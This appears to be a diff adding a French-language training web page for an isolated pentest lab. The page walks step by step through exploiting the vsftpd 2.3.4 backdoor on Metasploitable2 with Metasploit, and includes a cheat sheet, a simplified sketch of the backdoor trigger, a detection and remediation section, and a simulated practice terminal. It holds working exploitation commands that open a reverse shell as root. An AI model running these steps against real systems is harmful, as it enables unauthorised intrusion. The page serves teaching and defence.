+vsftpd 2.3.2 - Denial of Service                       | linux/dos/16270.rb
+vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/17491.rb
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/49757.rb
+------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">bilan</span><span class="v">quatre résultats, mais un seul concerne la version <strong>exacte</strong> vue par nmap (2.3.4) <em>et</em> promet une vraie exécution de commande plutôt qu'un simple déni de service : la ligne "Backdoor Command Execution".</span>
+            <span class="k">.rb</span><span class="v">l'extension du chemin indique un module <strong>déjà prêt pour Metasploit</strong> (Ruby) — pas besoin de compiler ou d'adapter un script C à la main, il suffit de le charger dans msfconsole.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <h3>Le bon module — msfconsole</h3>
+          <p class="step-sub">vsftpd 2.3.4 est un cas connu : une backdoor a été injectée dans le code source officiel, pas une vulnérabilité classique à exploiter techniquement.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Metasploit tip: You can pivot connections over sessions started with the ssh_login modules
+
+=[ metasploit v6.4.135-dev                               ]
++ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]
++ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]
+
+Metasploit Documentation: https://docs.metasploit.com/</span>
+
+<span class="prompt">msf ></span> search vsftpd<button class="copy-btn" type="button" data-copy="search vsftpd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">#  Name                                  Disclosure Date  Rank       Check  Description
+-  ----                                  ---------------  ----       -----  -----------
+0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution</span>
+
+<span class="prompt">msf ></span> use exploit/unix/ftp/vsftpd_234_backdoor<button class="copy-btn" type="button" data-copy="use exploit/unix/ftp/vsftpd_234_backdoor" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf exploit(…) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RHOSTS => 192.168.56.20</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">backdoor</span><span class="v">différent d'un bug logiciel : du code malveillant a été ajouté délibérément dans l'archive source à une époque. Pas de payload compliqué à construire — juste un motif de connexion qui l'active.</span>
+            <span class="k">deux résultats</span><span class="v">le module "232" ne fait que <strong>planter</strong> le service (déni de service, aucun accès) ; seul le "234_backdoor" donne une vraie exécution de commande — et correspond à la version exacte vue par nmap.</span>
+            <span class="k">RHOSTS</span><span class="v"><strong>Remote HOST</strong> — l'adresse de la cible. Toujours réglé en premier.</span>
+            <span class="k">rank</span><span class="v">"excellent" dans Metasploit signifie que l'exploit est fiable et sans risque de planter le service — un bon indicateur pour débuter.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <h3>LHOST — l'adresse de retour du reverse shell</h3>
+          <p class="step-sub">Avant de lancer l'exploit, une dernière variable à régler.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(…) ></span> set LHOST 192.168.56.10<button class="copy-btn" type="button" data-copy="set LHOST 192.168.56.10" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">LHOST => 192.168.56.10</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">pourquoi</span><span class="v">le payload utilisé est un <strong>reverse shell</strong> : ce n'est pas Kali qui va "prendre" un accès, c'est la cible compromise qui va <strong>rappeler</strong> Kali. Pour ça, il faut lui dire où rappeler.</span>
+            <span class="k">LHOST</span><span class="v"><strong>Local HOST</strong> — ton IP à toi (l'attaquant), sur laquelle Metasploit écoute la connexion retour.</span>
+            <span class="k">à retenir</span><span class="v">RHOST = la cible · LHOST = toi. Les deux doivent être réglés <strong>avant</strong> de lancer l'exploit — l'ordre méthodique : module → RHOSTS → LHOST → exploit.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">7</div>
+          <h3>Exploitation et vérification</h3>
+          <p class="step-sub">Le moment clé : la backdoor se déclenche et renvoie un accès.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(…) ></span> exploit<button class="copy-btn" type="button" data-copy="exploit" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444</span>
+<span class="out">[*] FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)</span>
+<span class="ok">[+] The target appears to be vulnerable. backdoor may be present</span>
+<span class="ok">[+] Backdoor has been spawned!</span>
+<span class="ok">[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)</span>
+
+<span class="prompt">meterpreter ></span> getuid<button class="copy-btn" type="button" data-copy="getuid" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">Server username: root</span>
+
+<span class="prompt">meterpreter ></span> shell<button class="copy-btn" type="button" data-copy="shell" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">$</span> whoami<button class="copy-btn" type="button" data-copy="whoami" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">root</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">handler</span><span class="v">Metasploit ouvre d'abord un <strong>listener</strong> local (le "reverse TCP handler") avant même de toucher la cible — il attend que quelqu'un le rappelle.</span>
+            <span class="k">meterpreter</span><span class="v">un environnement propre à Metasploit, avec son propre jeu de commandes (<strong>getuid</strong>, pas whoami). La commande <strong>shell</strong> bascule vers un vrai terminal Linux de la cible, où whoami/id/ls fonctionnent normalement.</span>
+            <span class="k">pourquoi root</span><span class="v">le service vsftpd tournait avec les privilèges <strong>root</strong> sur cette machine (mauvaise pratique très courante sur les vieux systèmes). La backdoor hérite automatiquement des droits du processus compromis — pas besoin d'escalade de privilèges en plus.</span>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <section id="cheatsheet">
+      <h2 class="section-title">Commandes à retenir</h2>
+      <p class="section-intro">Le strict nécessaire, groupé par phase — le reste peut se retrouver avec <span style="font-family:var(--mono); color:var(--text);">--help</span>.</p>
+
+      <div class="cheat-group">
+        <h4>réseau</h4>
+        <table class="cheat">
+          <tr><td class="cmd">ip addr add IP/24 dev eth0</td><td class="desc">assigner une IP à une interface (Kali)</td></tr>
+          <tr><td class="cmd">ifconfig eth0 IP netmask MASK up</td><td class="desc">idem, syntaxe ancienne (Metasploitable2)</td></tr>
+          <tr><td class="cmd">ping IP</td><td class="desc">vérifier la connectivité avant tout scan</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>reconnaissance</h4>
+        <table class="cheat">
+          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports ouverts + versions + scripts de base</td></tr>
+          <tr><td class="cmd">searchsploit SERVICE</td><td class="desc">recherche large, à affiner ensuite sur les versions</td></tr>
+          <tr><td class="cmd">searchsploit -u</td><td class="desc">mettre à jour la base locale (nécessite internet)</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>metasploit</h4>
+        <table class="cheat">
+          <tr><td class="cmd">search TERME</td><td class="desc">trouver un module dans msfconsole</td></tr>
+          <tr><td class="cmd">use CHEMIN/MODULE</td><td class="desc">charger le module</td></tr>
+          <tr><td class="cmd">set RHOSTS IP</td><td class="desc">définir la cible</td></tr>
+          <tr><td class="cmd">set LHOST IP</td><td class="desc">définir ton IP, pour les payloads reverse</td></tr>
+          <tr><td class="cmd">show options</td><td class="desc">vérifier la config avant de lancer</td></tr>
+          <tr><td class="cmd">exploit / run</td><td class="desc">lancer l'attaque</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>post-exploitation</h4>
+        <table class="cheat">
+          <tr><td class="cmd">getuid</td><td class="desc">identité courante, en Meterpreter</td></tr>
+          <tr><td class="cmd">shell</td><td class="desc">basculer vers un vrai shell système</td></tr>
+          <tr><td class="cmd">whoami / id</td><td class="desc">identité, une fois dans le shell système</td></tr>
+          <tr><td class="cmd">sysinfo</td><td class="desc">infos sur l'OS cible, en Meterpreter</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="concepts">
+      <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
+      <div class="concepts">
+        <div class="concept">
+          <h4>Backdoor ≠ vulnérabilité classique</h4>
+          <p>Une faille logique (débordement de mémoire, injection) s'exploite en détournant un comportement du programme. Une backdoor comme celle de vsftpd 2.3.4 est du code ajouté délibérément par un tiers dans le source officiel : il suffit de déclencher le motif prévu, sans construire d'attaque technique.</p>
+        </div>
+        <div class="concept">
+          <h4>Reverse shell : la cible rappelle l'attaquant</h4>
+          <p>Un shell "direct" ferait se connecter Kali vers la cible. Un shell "reverse" fait l'inverse : le code exécuté sur la cible initie la connexion vers Kali (LHOST/LPORT), souvent pour contourner des restrictions réseau côté cible qui bloqueraient une connexion entrante.</p>
+        </div>
+        <div class="concept">
+          <h4>Pourquoi un accès root direct</h4>
+          <p>Le niveau de privilège obtenu dépend du compte sous lequel tournait le service compromis. vsftpd tournait ici en root — une configuration dangereuse mais fréquente sur les vieux systèmes non durcis. D'autres services mal configurés donnent un accès limité : il faut alors une étape supplémentaire d'élévation de privilèges.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="anatomie">
+      <h2 class="section-title">Anatomie de la backdoor</h2>
+      <p class="section-intro">Ce n'est pas une faille de vsftpd — c'est une archive piégée. Comprendre la différence change la façon de chercher ce genre d'incident.</p>
+
+      <div class="concepts">
+        <div class="concept">
+          <h4>Une chaîne d'approvisionnement compromise, pas un bug de code</h4>
+          <p>Entre le 30 juin et le 3 juillet 2011, l'archive <code style="font-family:var(--mono); color:var(--text);">vsftpd-2.3.4.tar.gz</code> proposée sur le site officiel de téléchargement a été remplacée par une version modifiée, suite à une intrusion sur le serveur qui l'hébergeait — référencé depuis sous <strong>CVE-2011-2523</strong>. Le numéro de version affiché restait "2.3.4" : rien dans le nom du fichier ne permettait de distinguer l'archive légitime de la piégée.</p>
+        </div>
+        <div class="concept">
+          <h4>Le déclencheur</h4>
+          <p>Le code ajouté observait le nom d'utilisateur envoyé au moment du login FTP. S'il contenait la séquence <strong>":)"</strong>, le processus ouvrait un shell brut sur le port <strong>TCP 6200</strong>, accessible ensuite à quiconque s'y connectait — sans mot de passe, sans lien avec le compte utilisé pour déclencher la condition.</p>
+          <div class="term" style="margin-top:14px;">
+            <div class="term-bar"><span class="dot"></span>reconstruction pédagogique — pas le code source exact</div>
+            <pre style="color:var(--muted);">// principe du contrôle ajouté au login FTP (simplifié)
+<span class="out">if (strstr(username, ":)") != NULL) {</span>
+<span class="out">    // ouvre un shell brut sur le port 6200, sans vérifier le mot de passe</span>
+<span class="out">    listen_and_spawn_shell(6200);</span>
+<span class="out">}</span></pre>
+          </div>
+          <p style="margin-top:14px;">C'est exactement ce que fait le module Metasploit utilisé plus haut : il se connecte en FTP avec un nom d'utilisateur contenant ":)", puis se reconnecte sur le port 6200 pour récupérer le shell ouvert.</p>
+        </div>
+        <div class="concept">
+          <h4>Pourquoi ça change la méthode de recherche</h4>
+          <p>Une faille "classique" (débordement de mémoire, injection) s'exploite en étudiant le comportement du programme. Une archive piégée comme celle-ci ne se voit pas en auditant le code de vsftpd lui-même — seule une <strong>vérification d'intégrité</strong> de l'archive téléchargée (hash comparé à celui publié par les mainteneurs) l'aurait révélée avant l'installation.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="detection">
+      <h2 class="section-title">Détection &amp; remédiation</h2>
+      <p class="section-intro">Le point de vue du défenseur : comment cet incident aurait pu être repéré, et ce qui limite l'impact d'un cas similaire à l'avenir.</p>
+
+      <div class="cheat-group">
+        <table class="cheat">
+          <tr><td class="cmd">md5sum / sha256sum archive.tar.gz</td><td class="desc">comparer le hash de toute archive téléchargée à celui publié par les mainteneurs, avant compilation — c'est la seule vérification qui aurait détecté celle-ci</td></tr>
+          <tr><td class="cmd">netstat -tulpn / ss -tulpn</td><td class="desc">un port 6200/tcp ouvert et non documenté sur un serveur FTP est un signal fort à surveiller</td></tr>
+          <tr><td class="cmd">règle IDS dédiée (Snort/Suricata)</td><td class="desc">signature connue pour ce motif de login — la détecte en surveillance réseau continue, sans attendre un audit manuel</td></tr>
+          <tr><td class="cmd">mise à jour vers vsftpd ≥ 2.3.5</td><td class="desc">la version corrigée retire le vecteur ; ne pas faire tourner le service en root réduit aussi l'impact si un cas similaire se reproduit</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="practice">
+      <h2 class="section-title">Terminal d'entraînement</h2>
+      <p class="section-intro">Rejoue la chaîne d'exploitation toi-même — y compris la partie qu'on saute trop vite d'habitude : <strong style="color:var(--text)">lire un résultat en entier et repérer ce qui compte</strong>. Le scan renvoie tout, à toi de chercher. Les indices donnent la logique, jamais la commande telle quelle.</p>
+
+      <div class="term-launch">
+        <button class="term-launch-btn" id="term-open-btn" type="button">
+          <span class="term-launch-dot"></span>
+          Ouvrir le terminal
+        </button>
+        <p class="term-launch-sub">Plein écran · indices logiques, pas de commande donnée · historique ↑ / ↓ comme un vrai shell</p>
+      </div>
+    </section>
+
+    <footer>
+      <div class="note">
+        <span class="ok">✓</span> lab isolé — réseau interne VirtualBox, aucune machine réelle ni connexion externe impliquée.
+      </div>
+    </footer>
+  </div>
+
+  <div class="term-fullscreen" id="term-fullscreen">
+    <div class="term-fs-header">
+      <div class="term-fs-headrow">
+        <div class="term-fs-titlebar">
+          <span class="term-fs-dot r"></span><span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+          <span class="term-fs-context" id="sim-context">kali@kali</span>
+        </div>
+        <button class="term-fs-close" id="term-close-btn" type="button" aria-label="Fermer le terminal">✕</button>
+      </div>
+      <div class="term-fs-info">
+        <span class="item">Cible <strong id="ib-target">192.168.56.20</strong></span>
+        <span class="item">Attaquant <strong id="ib-attacker">192.168.56.10</strong></span>
+        <span class="item mode" id="sim-mode-label">reconnaissance</span>
+      </div>
+      <div class="term-progress">
+        <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
+        <span class="term-progress-label" id="sim-progress">étape 1/12</span>
+      </div>
+      <div class="term-fs-consigne" id="term-fs-consigne">
+        <span class="consigne-tag" id="consigne-tag">Consigne</span>
+        <span class="consigne-text" id="consigne-text">—</span>
+      </div>
+    </div>
+
+    <!-- Zone qui défile : uniquement l'historique + la ligne de saisie vivante,
+         exactement comme un vrai terminal (rien d'autre n'y vit). La ligne de
+         saisie ci-dessous est déplacée en fin de zone à chaque commande, pour
+         rester toujours la toute dernière ligne — comme un vrai prompt shell. -->
+    <div class="sim-body" id="sim-body">
+      <div class="sim-line sim-inputline" id="sim-inputline">
+        <span class="p" id="sim-prompt-label">$</span>
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ pour l'historique)" autocomplete="off" spellcheck="false">
+      </div>
+    </div>
+
+    <div class="term-fs-footer">
+      <div class="analyze-popup" id="analyze-popup">
+        <span class="ap-tag" id="ap-tag">À analyser</span>
+        <p class="ap-question" id="ap-question">—</p>
+        <div class="ap-actions">
+          <button class="ap-btn ap-continue" id="ap-continue-btn" type="button">Continuer →</button>
+        </div>
+      </div>
+      <div class="sim-hint-box" id="sim-hint-box"></div>
+      <div class="sim-controls">
+        <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
+        <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
+        <button class="sim-btn continue" id="sim-continue-btn" style="display:none;">Continuer →</button>
+        <button class="sim-btn continue" id="sim-connect-btn" style="display:none;">🔌 Connexion réseau</button>
+        <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  // ---------- SÉQUENCE ----------
+  // kind "type"    : il faut taper une commande pour avancer.
+  // kind "analyze" : pas de commande — on relit la sortie précédente, indice/solution surlignent, "Continuer" fait avancer.
+  // kind "connect" : pas de saisie non plus — la config réseau est déjà couverte dans le cours ci-dessus,
+  //                  ici on se contente de déclencher les deux machines via un bouton dédié.
+  const steps = [
+    { kind:"connect",
+      consigne:"Connecte les deux machines au réseau interne avant de commencer.",
+      lines:[
+        {context:"kali@kali", prompt:"$", cmd:"sudo ip addr add 192.168.56.10/24 dev eth0", output:[]},
+        {context:"kali@kali", prompt:"$", cmd:"sudo ip link set eth0 up", output:[]},
+        {context:"msfadmin@metasploitable", prompt:"$", cmd:"sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up", output:[]}
+      ] },
+
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Lance une reconnaissance complète sur la cible",
+      accepted:["nmap -sv -sc 192.168.56.20"],
+      hint:"Il te faut l'outil de référence pour la reconnaissance réseau : capable, en un seul passage, de lister les ports ouverts, d'identifier la version précise de chaque service qui tourne dessus, et de lancer quelques scripts de diagnostic complémentaires (bannières, vérifications basiques). Consulte son aide pour trouver les options qui activent ces deux derniers points.",
+      output:[
+        {t:"Nmap scan report for 192.168.56.20", c:"o"},
+        {t:"21/tcp   open  ftp         vsftpd 2.3.4", c:"o", id:"hl-ftp"},
+        {t:"|_ftp-anon: Anonymous FTP login allowed", c:"o", id:"hl-anon"},
+        {t:"22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1", c:"o"},
+        {t:"23/tcp   open  telnet      Linux telnetd", c:"o"},
+        {t:"25/tcp   open  smtp        Postfix smtpd", c:"o"},
+        {t:"53/tcp   open  domain      ISC BIND 9.4.2", c:"o"},
+        {t:"80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)", c:"o"},
+        {t:"111/tcp  open  rpcbind     2 (RPC #100000)", c:"o"},
+        {t:"139/tcp  open  netbios-ssn Samba smbd 3.X", c:"o"},
+        {t:"445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian", c:"o"},
+        {t:"512/tcp  open  exec        netkit-rsh rexecd", c:"o"},
+        {t:"1099/tcp open  java-rmi    GNU Classpath grmiregistry", c:"o"},
+        {t:"2049/tcp open  nfs         2-4 (RPC #100003)", c:"o"},
+        {t:"3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5", c:"o"},
+        {t:"5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7", c:"o"},
+        {t:"5900/tcp open  vnc         VNC (protocol 3.3)", c:"o"},
+        {t:"6667/tcp open  irc         UnrealIRCd", c:"o"},
+        {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"}
+      ] },
+
+    { kind:"analyze",
+      question:"18 ports ouverts. Avant de foncer sur le premier venu : lequel de ces services te semble le plus prometteur pour un premier essai ?",
+      hint:"Repère les versions les plus anciennes <em>et</em> les accès qui ne demandent aucune authentification. Un des services coche les deux cases.",
+      highlightIds:["hl-ftp","hl-anon"],
+      annotation:"→ vsftpd 2.3.4 (2011) + connexion anonyme autorisée : ça vaut le coup de chercher un exploit connu pour cette version précise." },
+
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Cherche des exploits publics pour vsftpd",
+      accepted:["searchsploit vsftpd"],
+      hint:"Kali embarque une base locale d'exploits publics, consultable par mot-clé simple — ce n'est pas une recherche intelligente. Comme vu dans le cours plus haut : une requête trop précise (avec numéro de version) risque de manquer une entrée existante. Reste large, sur le nom du service uniquement, et trie ensuite les résultats toi-même.",
+      output:[
+        {t:"------------------------------------------------------- ---------------------------------", c:"o"},
+        {t:" Exploit Title                                         |  Path", c:"o"},
+        {t:"------------------------------------------------------- ---------------------------------", c:"o"},
+        {t:"vsftpd 2.0.5 - 'CWD' (Authenticated) Denial of Service | linux/dos/5814.txt", c:"o"},
+        {t:"vsftpd 2.3.2 - Denial of Service                       | linux/dos/16270.rb", c:"o", id:"hl-dos-sploit"},
+        {t:"vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/17491.rb", c:"o", id:"hl-backdoor-sploit"},
+        {t:"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/49757.rb", c:"o", id:"hl-backdoor-msf"},
+        {t:"------------------------------------------------------- ---------------------------------", c:"o"},
+        {t:"Shellcodes: No Results", c:"o"}
+      ] },
+
+    { kind:"analyze",
+      question:"Quatre résultats pour vsftpd. Un seul mérite d'être chargé dans Metasploit pour obtenir un vrai accès plutôt qu'un simple plantage — lequel, et pourquoi le chemin en .rb est un indice ?",
+      hint:"Regarde la version exacte (2.3.4) et le mot Backdoor — .rb veut dire module Ruby, déjà prêt pour msfconsole.",
+      highlightIds:["hl-backdoor-msf"],
+      annotation:"→ \"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)\" : bonne version, vraie exécution de commande, et déjà packagé en module Ruby pour Metasploit." },
+
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Lance Metasploit",
+      accepted:["msfconsole"],
+      hint:"Le module repéré est un fichier .rb : il ne s'exécute pas tout seul depuis un simple shell, il doit être chargé par le framework capable de l'interpréter. Ce framework a une console interactive dédiée, qu'on démarre par une seule commande depuis Kali — c'est l'outil le plus connu du lab, présent dans le nom du menu Kali qui le contient.",
+      output:[
+        {t:"Metasploit tip: You can pivot connections over sessions started with the ssh_login modules", c:"o"},
+        {t:"", c:"o"},
+        {t:"=[ metasploit v6.4.135-dev                               ]", c:"o"},
+        {t:"+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]", c:"o"},
+        {t:"+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]", c:"o"},
+        {t:"", c:"o"},
+        {t:"Metasploit Documentation: https://docs.metasploit.com/", c:"o"}
+      ] },
+
+    { kind:"type", context:"msf", prompt:">",
+      task:"Cherche un module Metasploit lié à ce service",
+      accepted:["search vsftpd"],
+      hint:"Une fois dans le framework, la même logique de recherche par mot-clé que tout à l'heure s'applique — c'est l'action la plus naturelle qu'on fait en entrant dans une console de ce type quand on cherche un module précis. Le nom du service seul suffit.",
+      output:[
+        {t:"#  Name                                  Disclosure Date  Rank       Check  Description", c:"o"},
+        {t:"-  ----                                  ---------------  ----       -----  -----------", c:"o"},
+        {t:"0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service", c:"o", id:"hl-dos"},
+        {t:"1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution", c:"o", id:"hl-backdoor"}
+      ] },
+
+    { kind:"analyze",
+      question:"Deux résultats, deux versions différentes (2.3.2 et 2.3.4), deux ranks différents. Lequel choisir pour obtenir une vraie prise de contrôle plutôt qu'un simple plantage du service ?",
+      hint:"Compare le rank des deux lignes — et la version exacte trouvée par nmap.",
+      highlightIds:["hl-backdoor"],
+      annotation:"→ rank \"excellent\" = exploit fiable, sans risque de planter le service. Et 2.3.4 correspond exactement à la version vue dans le scan." },
+
+    { kind:"type", context:"msf", prompt:">",
+      task:"Charge le bon module",
+      accepted:["use exploit/unix/ftp/vsftpd_234_backdoor", "use 1"],
+      wrongAnswers:{
+        "use auxiliary/dos/ftp/vsftpd_232":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Regarde à nouveau lequel a le rank \"excellent\".",
+        "use 0":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Regarde à nouveau lequel a le rank \"excellent\"."
+      },
+      hint:"Un module Metasploit doit d'abord être chargé dans la console avant de pouvoir être configuré ou lancé. Il existe une commande dédiée à ça dans le framework — repense à comment les résultats de la recherche précédente étaient présentés : la liste donnait deux façons de désigner chaque module.",
+      output:[] },
+
+    { kind:"type", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
+      task:"Définis la cible (RHOSTS)",
+      accepted:["set rhosts 192.168.56.20"],
+      hint:"Avant de lancer quoi que ce soit, le module chargé a besoin de savoir sur quelle machine agir. Metasploit fonctionne avec des variables de configuration propres à chaque module (visibles via show options) — l'une d'elles désigne précisément la cible distante. Trouve son nom et donne-lui la bonne valeur avec la commande de configuration du framework.",
+      output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
+
+    { kind:"type", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
+      task:"Définis LHOST (ton IP, pour le reverse shell)",
+      accepted:["set lhost 192.168.56.10"],
+      hint:"Le payload utilisé est un reverse shell : c'est la cible compromise qui va rappeler Kali, pas l'inverse — il lui faut donc une adresse où rappeler. Une seconde variable, symétrique à celle réglée à l'étape précédente, désigne cette fois ta propre machine plutôt que la cible. Même commande de configuration, ta propre IP en valeur.",
+      output:[{t:"LHOST => 192.168.56.10", c:"ok"}] },
+
+    { kind:"type", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
+      task:"Lance l'exploit",
+      accepted:["exploit", "run"],
+      hint:"Cible et hôte local sont configurés — il ne manque plus qu'un verbe d'action, très court, qui lance concrètement le module chargé.",
+      output:[
+        {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
+        {t:"[+] Backdoor has been spawned!", c:"ok"},
+        {t:"[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)", c:"ok"}
+      ] }
+  ];
+
+  // ---------- MODE LIBRE (après l'exploit) ----------
+  let freeContext = "meterpreter";
+  const freeCommands = {
+    meterpreter: {
+      "getuid": [{t:"Server username: root", c:"ok"}],
+      "sysinfo": [{t:"OS : Linux metasploitable 2.6.24-16-server", c:"o"}],
+      "shell": [{t:"Process created. Channel opened.", c:"o"}]
+    },
+    "root@metasploitable": {
+      "whoami": [{t:"root", c:"ok"}],
+      "id": [{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}],
+      "pwd": [{t:"/root", c:"o"}],
+      "ls": [{t:"bin  boot  etc  home  root  tmp  usr  var", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}]
+    }
+  };
+</script>
+<script src="engine.js"></script>
+
+
+</body>
+</html>
